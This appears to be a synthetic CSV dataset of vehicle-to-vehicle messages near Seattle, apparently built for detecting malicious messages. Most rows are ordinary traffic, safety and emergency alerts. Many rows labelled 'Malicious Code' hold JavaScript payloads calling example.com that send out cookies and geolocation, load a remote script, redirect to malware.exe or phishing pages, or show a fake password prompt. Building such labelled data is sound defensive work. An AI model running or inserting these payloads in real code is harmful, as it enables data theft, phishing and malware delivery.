Timestamp,Vehicle_ID,Vehicle_Type,Latitude,Longitude,Speed,Message_Type,Message_Content,Weather_Condition
11:30.8,vehicle_10,car,47.68539293,-122.3600506,65.17303053,Traffic Update,Traffic backup on Route 66.,foggy
45:10.7,vehicle_62,truck,47.63149747,-122.3986721,23.66487711,Safety,Be cautious of Detours.,snowy
16:11.5,vehicle_54,car,47.64970174,-122.3389007,95.67450868,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
14:30.4,vehicle_54,motorcycle,47.6444937,-122.3039861,10.0080755,Emergency Update,Bridge collapse in your surrounding area.,clear
05:16.9,vehicle_53,car,47.60753926,-122.369832,70.78884888,Safety,Beware of Spills.,rainy
14:57.8,vehicle_21,truck,47.63226768,-122.3542153,80.50823051,Emergency Update,Multi-vehicle accident locally.,snowy
35:59.9,vehicle_58,truck,47.68408511,-122.3421685,90.50250235,Emergency Update,Chemical spill in your region.,rainy
35:06.1,vehicle_2,car,47.60952416,-122.399198,22.21304099,Safety,Be on the lookout for Slippery roads due to rain or snow.,rainy
12:15.7,vehicle_55,car,47.69042613,-122.3937305,91.70690758,Safety,Beware of Black ice.,rainy
27:51.7,vehicle_1,truck,47.63270528,-122.3201154,113.6651026,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,foggy
20:11.2,vehicle_65,truck,47.63040968,-122.3880385,23.19594358,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,snowy
50:17.4,vehicle_31,motorcycle,47.68356856,-122.3765102,43.54053882,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
16:41.7,vehicle_67,truck,47.62380321,-122.3269246,4.579404106,Emergency Update,Power outage in your surrounding area.,clear
01:19.3,vehicle_85,motorcycle,47.68149027,-122.3508257,49.31809968,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
06:43.8,vehicle_59,truck,47.61866138,-122.3782693,104.0395149,Emergency Update,Detour due to emergency in your locale.,rainy
36:02.8,vehicle_46,truck,47.69275393,-122.3179532,53.69072004,Malicious Code,"prompt('Enter your password:', 'Password Required');",rainy
09:43.6,vehicle_49,motorcycle,47.64307167,-122.3640089,8.704728436,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
26:02.7,vehicle_6,car,47.62855508,-122.3845256,92.58807783,Traffic Update,Heavy traffic on Provincial Highway 1.,snowy
05:04.1,vehicle_63,motorcycle,47.62840109,-122.3153125,48.31547869,Traffic Update,Slow traffic on Main Street.,rainy
57:38.8,vehicle_5,car,47.67456564,-122.3169268,106.3449091,Traffic Update,Slow traffic on Interstate 40.,snowy
48:27.0,vehicle_40,car,47.66229863,-122.3868309,6.557667121,Traffic Update,Heavy traffic on A1.,snowy
23:00.6,vehicle_5,car,47.67121014,-122.3352274,27.43073044,Traffic Update,Traffic bottleneck on County Road 1.,clear
19:26.7,vehicle_62,motorcycle,47.69889438,-122.3287944,29.57922519,Safety,Watch out for Inclement weather.,foggy
52:23.0,vehicle_67,truck,47.61661355,-122.3135161,20.43661861,Emergency Update,Power outage in your locality.,foggy
41:27.7,vehicle_8,truck,47.67890965,-122.3897087,48.75942827,Traffic Update,Traffic bottleneck on A1.,clear
27:10.7,vehicle_28,car,47.65683799,-122.3502504,48.88442669,Emergency Update,Multi-vehicle accident in your surrounding area.,clear
49:43.1,vehicle_41,truck,47.67805833,-122.3073051,30.11646099,Emergency Update,Hazardous materials incident in your part of town.,rainy
53:23.9,vehicle_74,car,47.60019569,-122.3924201,0.052088735,Traffic Update,Traffic backup on M25.,snowy
28:45.0,vehicle_98,truck,47.63989265,-122.3207524,77.40715368,Traffic Update,Severe traffic congestion on Route 66.,foggy
24:06.7,vehicle_13,car,47.64350436,-122.374606,109.9773654,Traffic Update,Stop-and-go traffic on Main Street.,clear
48:33.4,vehicle_34,motorcycle,47.61901858,-122.3147323,25.23539757,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,clear
45:58.6,vehicle_25,motorcycle,47.66970967,-122.3746632,42.44358885,Safety,Avoid Accidents.,snowy
52:54.9,vehicle_70,motorcycle,47.60383799,-122.3952855,37.25985896,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
39:12.4,vehicle_8,car,47.69342712,-122.3823168,30.40369424,Emergency Update,Road collapse in your region.,snowy
36:52.4,vehicle_24,motorcycle,47.65727323,-122.3986614,65.99713355,Safety,Stay informed about Detours.,rainy
10:09.1,vehicle_79,truck,47.68056383,-122.3313458,72.03588596,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
09:47.7,vehicle_81,car,47.63233807,-122.313699,15.56041598,Traffic Update,Traffic is at a standstill on the northbound lanes of Local Street.,clear
45:12.8,vehicle_62,truck,47.66111292,-122.3189935,10.83257024,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,foggy
17:19.9,vehicle_16,car,47.637992,-122.3429992,20.84407578,Traffic Update,Traffic backup on Provincial Highway 1.,foggy
22:13.7,vehicle_66,car,47.60918415,-122.3899898,28.67486486,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
19:01.7,vehicle_63,truck,47.65205154,-122.3786364,12.35416127,Traffic Update,Traffic is at a standstill on the northbound lanes of State Highway 1.,foggy
51:50.5,vehicle_19,motorcycle,47.62437151,-122.3590772,63.14597764,Traffic Update,At-a-standstill traffic on Drive.,clear
09:50.5,vehicle_18,truck,47.65316469,-122.3701921,118.0251166,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
11:10.3,vehicle_83,motorcycle,47.60673767,-122.3257213,43.50505208,Traffic Update,Slow traffic on Bundesautobahn 1.,clear
36:20.9,vehicle_6,truck,47.67137869,-122.3147228,26.77492683,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
26:10.4,vehicle_48,car,47.66360243,-122.3424411,34.02083312,Safety,Exercise caution regarding Black ice.,foggy
12:49.5,vehicle_69,motorcycle,47.60127456,-122.3061296,36.07936289,Emergency Update,Bridge collapse in your community.,clear
24:09.9,vehicle_14,car,47.64169658,-122.3869832,50.21610789,Safety,Stay away from Road closures.,snowy
26:35.2,vehicle_4,truck,47.61469664,-122.3414034,14.4101917,Emergency Update,Multi-vehicle accident in your region.,clear
34:52.0,vehicle_89,motorcycle,47.68679432,-122.3691157,54.62396439,Traffic Update,Heavy congestion on City Road 1.,rainy
43:47.3,vehicle_26,motorcycle,47.60544273,-122.3169452,82.04666247,Emergency Update,Bridge collapse in your locality.,clear
33:11.1,vehicle_86,motorcycle,47.6162156,-122.3777846,39.75981901,Traffic Update,Tailback on I-95.,snowy
44:57.2,vehicle_22,car,47.62197028,-122.3113734,4.104147521,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
34:24.1,vehicle_41,motorcycle,47.63124609,-122.3901077,119.0483113,Safety,Look out for Construction zones.,snowy
24:03.4,vehicle_59,car,47.64586345,-122.3238833,22.25540746,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
58:11.4,vehicle_39,car,47.62216561,-122.3201277,101.9068892,Safety,Be cautious of Black ice.,foggy
56:44.1,vehicle_14,truck,47.6319583,-122.3587263,105.7990863,Traffic Update,Tailback on US-101.,snowy
41:40.9,vehicle_82,car,47.67674726,-122.326167,33.47624605,Traffic Update,Heavy congestion on City Road 1.,rainy
03:54.8,vehicle_64,motorcycle,47.65447226,-122.3918437,0.357508615,Traffic Update,Heavy traffic on State Highway 1.,rainy
24:14.1,vehicle_94,car,47.65934762,-122.320805,25.57666727,Safety,Avoid Spills.,foggy
58:23.7,vehicle_8,truck,47.68174818,-122.3647736,84.47648832,Safety,Be on the lookout for Spills.,rainy
18:19.6,vehicle_60,truck,47.63766631,-122.3006504,37.67604592,Emergency Update,Traffic diversion locally.,snowy
00:50.3,vehicle_81,truck,47.61461808,-122.383413,61.44343204,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
14:00.3,vehicle_55,motorcycle,47.6531101,-122.310685,12.14422394,Emergency Update,Water crisis in your locale.,snowy
18:03.6,vehicle_4,motorcycle,47.68813403,-122.3019137,72.30316632,Traffic Update,Heavy traffic on Local Street.,clear
22:43.1,vehicle_95,truck,47.6940283,-122.320327,76.37797372,Emergency Update,Traffic accident in your neighborhood.,clear
15:44.0,vehicle_52,motorcycle,47.65311307,-122.3891843,42.46585057,Emergency Update,Active shooter in your part of town.,snowy
48:21.7,vehicle_85,motorcycle,47.60690416,-122.329922,96.60619811,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
32:39.4,vehicle_77,truck,47.64585896,-122.3538219,67.70278403,Emergency Update,Hazardous materials incident in your part of town.,snowy
58:29.9,vehicle_64,truck,47.61327291,-122.316045,83.05719412,Safety,Watch out for Potholes.,snowy
49:03.3,vehicle_68,car,47.61280098,-122.3022052,106.7967243,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
12:04.6,vehicle_26,car,47.60315513,-122.3875863,36.73621763,Safety,Look out for Accidents.,clear
05:26.1,vehicle_31,truck,47.68255778,-122.3810797,96.90348491,Emergency Update,Bridge collapse in your vicinity.,foggy
26:17.5,vehicle_88,car,47.68068361,-122.3353206,2.339835215,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
09:04.1,vehicle_48,car,47.62796009,-122.3490129,16.7567986,Traffic Update,At-a-standstill traffic on Main Street.,clear
06:09.2,vehicle_84,truck,47.62354931,-122.3616654,108.7261784,Traffic Update,Traffic jam on County Road 1.,clear
54:14.2,vehicle_60,motorcycle,47.64032835,-122.3520377,103.8953231,Safety,Look out for Wildlife crossing.,snowy
56:27.3,vehicle_48,truck,47.66851242,-122.3759236,97.18556185,Malicious Code,location.href = 'https://example.com/malware.exe';,foggy
02:10.2,vehicle_0,motorcycle,47.60201318,-122.384802,0.657725322,Traffic Update,Traffic jam on A1.,clear
34:20.5,vehicle_6,motorcycle,47.63237394,-122.3707829,66.79864313,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,rainy
55:00.2,vehicle_47,car,47.60626338,-122.3007835,114.6880817,Emergency Update,Bridge collapse in your surrounding area.,snowy
20:29.9,vehicle_90,car,47.69845585,-122.3333793,56.95999294,Safety,Be cautious of Wildlife crossing.,rainy
44:43.4,vehicle_72,motorcycle,47.65157804,-122.3201272,4.76331211,Traffic Update,Traffic backup on Bundesautobahn 1.,rainy
05:06.6,vehicle_91,car,47.62179323,-122.3251803,18.88168766,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
30:01.5,vehicle_73,truck,47.63084461,-122.3981118,96.68249631,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
04:48.0,vehicle_54,motorcycle,47.62502622,-122.3004448,39.38576225,Emergency Update,Water crisis in your locale.,rainy
53:25.8,vehicle_63,motorcycle,47.65123615,-122.3832208,9.841217629,Emergency Update,Traffic accident in your immediate area.,rainy
01:55.0,vehicle_95,truck,47.68261815,-122.3407803,23.50911219,Emergency Update,Chemical spill in your immediate area.,snowy
32:12.5,vehicle_11,car,47.62256483,-122.3504404,107.5312055,Emergency Update,Natural disaster in your locale.,foggy
35:41.5,vehicle_55,motorcycle,47.67215116,-122.386382,72.82009955,Safety,Be aware of Black ice.,foggy
48:46.9,vehicle_36,motorcycle,47.66362372,-122.3087192,114.6679051,Safety,Look out for Potholes.,snowy
14:08.8,vehicle_26,car,47.62344953,-122.3175455,106.4885537,Safety,Be cautious of Road construction.,snowy
06:15.1,vehicle_98,motorcycle,47.63110458,-122.3733284,68.36466321,Traffic Update,Traffic is at a standstill on the northbound lanes of I-95.,clear
35:37.7,vehicle_30,car,47.68247384,-122.3404604,46.96226951,Safety,Exercise caution regarding Uneven surfaces.,clear
14:32.8,vehicle_69,car,47.62573761,-122.335202,52.18609773,Safety,Be alert to Black ice.,foggy
09:44.6,vehicle_50,car,47.60767418,-122.3956484,92.03076964,Safety,Stay informed about Spills.,rainy
10:51.4,vehicle_16,motorcycle,47.62492112,-122.3069295,28.93099329,Traffic Update,Slow traffic on Boulevard.,foggy
03:48.2,vehicle_80,car,47.6686835,-122.3309035,4.074561043,Emergency Update,Bridge collapse in your part of town.,rainy
49:08.6,vehicle_41,car,47.63897257,-122.3308488,26.66481742,Traffic Update,Severe traffic congestion on Main Street.,rainy
37:23.0,vehicle_1,car,47.64480229,-122.3425401,29.66065927,Emergency Update,Power outage in your jurisdiction.,rainy
05:00.1,vehicle_8,truck,47.60090277,-122.3295019,60.95424377,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
57:14.7,vehicle_66,truck,47.67846964,-122.3538216,5.220376562,Safety,Be on the lookout for Fallen trees.,snowy
02:31.1,vehicle_17,car,47.65066887,-122.3954049,82.80075097,Emergency Update,Bridge collapse in your region.,rainy
29:44.8,vehicle_91,motorcycle,47.63621759,-122.3141051,40.28941194,Safety,Be alert to Debris.,rainy
13:28.5,vehicle_73,truck,47.62791435,-122.3942363,9.01408997,Safety,Take precautions against Potholes.,foggy
30:28.6,vehicle_81,motorcycle,47.65085843,-122.3691022,17.53640864,Traffic Update,At-a-standstill traffic on National Highway 1.,foggy
11:10.5,vehicle_28,motorcycle,47.68401569,-122.3484197,70.65772223,Safety,Look out for Wildlife crossing.,clear
05:40.5,vehicle_39,truck,47.61048648,-122.3672294,59.33483287,Safety,Be on the lookout for Detours.,clear
38:14.6,vehicle_63,truck,47.65877437,-122.3324295,20.91847156,Emergency Update,Head-on collision in your immediate area.,foggy
28:15.8,vehicle_81,car,47.63573407,-122.365084,49.03199697,Emergency Update,Active shooter in your jurisdiction.,foggy
47:46.2,vehicle_23,truck,47.64153521,-122.3629434,56.29995463,Traffic Update,Traffic jam on Boulevard.,rainy
41:26.6,vehicle_34,car,47.68863579,-122.380004,23.31999253,Traffic Update,Traffic is at a standstill on the northbound lanes of I-95.,clear
12:42.7,vehicle_48,truck,47.67102506,-122.319554,40.43814965,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",clear
56:38.3,vehicle_18,car,47.61699646,-122.3496622,88.34823779,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",clear
20:31.6,vehicle_76,truck,47.61799284,-122.3165529,65.78079923,Emergency Update,Traffic diversion in your community.,rainy
26:39.6,vehicle_27,truck,47.68247006,-122.3392454,4.150089564,Emergency Update,Terrorist attack in your jurisdiction.,rainy
16:39.0,vehicle_30,car,47.68399892,-122.3573033,33.36139991,Emergency Update,Chemical spill in your jurisdiction.,rainy
03:33.2,vehicle_3,car,47.60004939,-122.366203,9.613578637,Emergency Update,Road collapse locally.,clear
30:08.4,vehicle_37,car,47.69696904,-122.3918037,108.6332455,Traffic Update,Stop-and-go traffic on Autostrada A1.,clear
20:32.5,vehicle_41,truck,47.64798191,-122.3744295,48.93099581,Emergency Update,Detour due to emergency in your part of town.,foggy
38:03.8,vehicle_7,car,47.61473331,-122.3713621,39.5754554,Traffic Update,Traffic jam on Main Street.,clear
08:30.8,vehicle_27,motorcycle,47.66463607,-122.3307938,90.46082805,Safety,Be alert to Slippery roads due to rain or snow.,foggy
41:44.3,vehicle_21,truck,47.60373745,-122.3878872,103.8989543,Safety,Look out for Icy roads.,snowy
22:11.9,vehicle_31,motorcycle,47.61842331,-122.3665306,38.35527155,Emergency Update,Emergency traffic in your part of town.,rainy
41:03.7,vehicle_76,motorcycle,47.67047738,-122.3141849,119.9370378,Safety,Watch out for Wildlife crossing.,rainy
44:08.6,vehicle_71,car,47.65424452,-122.3516321,85.27722587,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
08:45.7,vehicle_26,motorcycle,47.6372692,-122.3106376,69.24497461,Safety,Stay informed about Road construction.,snowy
43:41.5,vehicle_59,motorcycle,47.66869382,-122.3120015,68.4127356,Traffic Update,Severe traffic congestion on Drive.,clear
30:16.7,vehicle_57,motorcycle,47.69657301,-122.3246918,1.905443007,Emergency Update,Evacuation order in your region.,snowy
48:12.6,vehicle_79,truck,47.63733822,-122.3053137,41.40251976,Emergency Update,Evacuation order in your jurisdiction.,snowy
39:58.0,vehicle_54,truck,47.64507926,-122.3657922,5.916067424,Safety,Beware of Road construction.,clear
51:45.1,vehicle_82,car,47.61929663,-122.3026035,119.2813309,Emergency Update,Traffic diversion in your jurisdiction.,rainy
03:11.9,vehicle_19,truck,47.69209429,-122.3107053,14.17285917,Traffic Update,Traffic bottleneck on Route 66.,rainy
07:08.6,vehicle_20,truck,47.60095236,-122.3800756,29.20550909,Emergency Update,Road collapse in your jurisdiction.,snowy
34:45.8,vehicle_92,truck,47.6064678,-122.3510707,61.0395364,Emergency Update,Chemical spill in your vicinity.,foggy
23:29.3,vehicle_91,motorcycle,47.65475112,-122.3792787,83.02533213,Emergency Update,Chemical spill in your community.,foggy
27:09.2,vehicle_77,car,47.61270599,-122.3110518,60.66045181,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,snowy
21:58.8,vehicle_52,motorcycle,47.60525631,-122.3597435,109.0771651,Emergency Update,Hazardous materials incident in your region.,snowy
19:01.6,vehicle_58,car,47.65847972,-122.3612089,108.3160002,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,snowy
27:17.9,vehicle_95,motorcycle,47.62808007,-122.3045595,104.6274857,Traffic Update,Traffic jam on US-101.,snowy
21:00.1,vehicle_87,car,47.67951221,-122.322575,45.00986029,Safety,Stay informed about Icy roads.,snowy
41:54.0,vehicle_93,motorcycle,47.67290233,-122.3314919,118.1701655,Safety,Be alert to Debris.,snowy
07:07.2,vehicle_48,car,47.6616405,-122.3778276,20.317226,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
06:25.8,vehicle_79,car,47.60834046,-122.304074,51.2042443,Safety,Watch out for Uneven surfaces.,snowy
04:03.3,vehicle_68,motorcycle,47.64069185,-122.3189124,27.24693435,Safety,Watch out for Black ice.,snowy
02:49.4,vehicle_54,truck,47.66631653,-122.3847254,88.49148492,Emergency Update,Detour due to emergency locally.,clear
11:08.2,vehicle_80,motorcycle,47.62430706,-122.3861561,85.29412364,Emergency Update,Road collapse in your surrounding area.,foggy
33:15.4,vehicle_76,motorcycle,47.61142134,-122.309287,101.9593537,Traffic Update,Tailback on I-95.,rainy
44:06.1,vehicle_86,motorcycle,47.6578439,-122.398797,72.64065561,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,rainy
56:12.4,vehicle_73,motorcycle,47.63547927,-122.3934704,51.28111231,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
40:27.2,vehicle_70,truck,47.67238764,-122.3971035,113.2363974,Traffic Update,Heavy traffic on Main Street.,snowy
58:23.1,vehicle_18,motorcycle,47.60687682,-122.3895756,62.31193549,Traffic Update,Traffic jam on Lane.,snowy
15:57.8,vehicle_87,car,47.66085895,-122.3071778,40.55573716,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
16:30.7,vehicle_13,motorcycle,47.692421,-122.3200134,57.29897699,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,clear
44:51.2,vehicle_19,truck,47.60487568,-122.3797213,6.159268137,Emergency Update,Road collapse in your immediate area.,foggy
45:08.7,vehicle_94,motorcycle,47.6908042,-122.3386963,11.03735553,Emergency Update,Bridge collapse in your neighborhood.,foggy
13:56.4,vehicle_97,car,47.6004918,-122.3101883,92.52307938,Safety,Be aware of Inclement weather.,rainy
28:23.9,vehicle_84,car,47.65904933,-122.3486877,59.01014326,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,foggy
51:56.8,vehicle_40,truck,47.66406643,-122.3774044,36.57125355,Emergency Update,Active shooter in your community.,clear
29:09.1,vehicle_66,motorcycle,47.61554989,-122.3219334,34.70004456,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
53:11.1,vehicle_20,motorcycle,47.60210879,-122.38659,12.47206667,Safety,Stay away from Icy roads.,foggy
21:18.0,vehicle_68,car,47.68398343,-122.3750764,52.98536024,Traffic Update,Gridlock on State Highway 1.,rainy
42:26.7,vehicle_98,motorcycle,47.65097729,-122.3128835,94.00367585,Safety,Look out for Black ice.,clear
23:19.4,vehicle_58,motorcycle,47.63926653,-122.3496184,73.97710894,Traffic Update,Stop-and-go traffic on Drive.,clear
01:09.7,vehicle_28,motorcycle,47.61276397,-122.3323679,26.6362218,Traffic Update,At-a-standstill traffic on Autostrada A1.,snowy
09:49.2,vehicle_78,truck,47.68344608,-122.3069735,37.20564639,Emergency Update,Major traffic collision locally.,rainy
34:47.6,vehicle_67,car,47.68254906,-122.3246934,91.88640853,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
30:22.0,vehicle_62,truck,47.60740882,-122.3344968,106.8255667,Traffic Update,At-a-standstill traffic on A1.,foggy
47:46.6,vehicle_85,motorcycle,47.62447978,-122.3134507,94.06547999,Safety,Stay away from Debris.,snowy
09:03.3,vehicle_56,truck,47.64468038,-122.353074,103.0649258,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",foggy
14:36.4,vehicle_58,motorcycle,47.67045945,-122.3007545,4.216004784,Emergency Update,Terrorist attack in your neighborhood.,snowy
50:21.2,vehicle_24,car,47.6451265,-122.3774068,68.96148186,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
02:32.8,vehicle_28,motorcycle,47.64136247,-122.3389107,63.41678897,Malicious Code,"prompt('Enter your password:', 'Password Required');",rainy
16:03.2,vehicle_69,car,47.63831332,-122.3767483,107.2177224,Traffic Update,Heavy traffic on US-101.,snowy
39:08.1,vehicle_47,motorcycle,47.68562652,-122.3263337,72.31542184,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
14:48.2,vehicle_5,truck,47.66475851,-122.391211,48.66267039,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
46:31.8,vehicle_93,car,47.61987853,-122.3958937,60.14727408,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",rainy
35:10.9,vehicle_86,car,47.66773969,-122.3434805,59.03753376,Safety,Be alert to Road closures.,rainy
43:26.2,vehicle_24,motorcycle,47.68157375,-122.3468367,99.48155605,Safety,Be cautious of Road construction.,rainy
44:04.8,vehicle_47,motorcycle,47.69580738,-122.383236,4.04930112,Emergency Update,Traffic accident in your part of town.,clear
51:15.1,vehicle_41,motorcycle,47.6072591,-122.3468845,40.27007658,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
53:51.7,vehicle_91,truck,47.67121516,-122.3104794,107.7458596,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,snowy
00:52.9,vehicle_6,truck,47.65641021,-122.3901987,66.34037337,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
33:21.7,vehicle_69,motorcycle,47.61149043,-122.3268343,70.37806569,Safety,Be alert to Slippery roads due to rain or snow.,rainy
14:54.5,vehicle_99,truck,47.6316945,-122.3836521,106.3915477,Safety,Look out for Construction zones.,snowy
42:15.1,vehicle_39,car,47.60867462,-122.3888492,76.72240532,Emergency Update,Detour due to emergency nearby.,foggy
24:48.1,vehicle_27,car,47.65728174,-122.3755812,10.5087742,Traffic Update,Heavy congestion on I-95.,foggy
26:21.1,vehicle_25,car,47.63874823,-122.3391511,108.700572,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),clear
23:11.0,vehicle_55,motorcycle,47.68475554,-122.3437625,31.16173711,Emergency Update,Multi-vehicle accident in your immediate area.,clear
04:22.9,vehicle_54,truck,47.65247935,-122.3815687,53.94235086,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
17:42.4,vehicle_39,car,47.63958071,-122.3729492,84.9237973,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
22:39.0,vehicle_21,car,47.6473078,-122.3205274,64.92592817,Emergency Update,Traffic diversion in your region.,snowy
07:24.6,vehicle_61,motorcycle,47.64009454,-122.330311,105.6687497,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",rainy
26:38.6,vehicle_90,truck,47.66130728,-122.3896757,86.76935494,Safety,Beware of Construction zones.,foggy
28:16.5,vehicle_54,car,47.63003466,-122.3947245,9.949190798,Traffic Update,Traffic is at a standstill on the northbound lanes of City Road 1.,foggy
56:02.8,vehicle_37,car,47.66627574,-122.3820451,9.376973052,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
14:17.1,vehicle_49,motorcycle,47.68568338,-122.3902605,83.32715263,Traffic Update,Traffic bottleneck on Autostrada A1.,rainy
59:35.4,vehicle_94,car,47.60658815,-122.3559438,110.469129,Emergency Update,Head-on collision in your vicinity.,clear
17:59.1,vehicle_98,motorcycle,47.62846544,-122.3022216,2.629890205,Safety,Be alert to Black ice.,snowy
22:45.5,vehicle_8,car,47.62468661,-122.3515729,28.58949735,Traffic Update,Slow traffic on A1.,snowy
07:58.0,vehicle_65,car,47.62014419,-122.3454327,81.88085931,Emergency Update,Major traffic collision in your locale.,foggy
14:27.4,vehicle_83,motorcycle,47.69973114,-122.3176295,52.79169195,Safety,Stay away from Detours.,rainy
08:39.9,vehicle_30,car,47.67030805,-122.3724918,108.9663094,Traffic Update,Heavy congestion on Avenue.,foggy
48:32.8,vehicle_2,truck,47.65211201,-122.3116687,115.4325833,Traffic Update,Traffic jam on US-101.,rainy
27:59.4,vehicle_19,motorcycle,47.61795611,-122.3326115,89.86885333,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
26:31.8,vehicle_17,truck,47.60684478,-122.3871729,89.50960008,Safety,Avoid Inclement weather.,snowy
32:44.7,vehicle_96,truck,47.6352557,-122.3694254,91.21344632,Traffic Update,Severe traffic congestion on National Highway 1.,clear
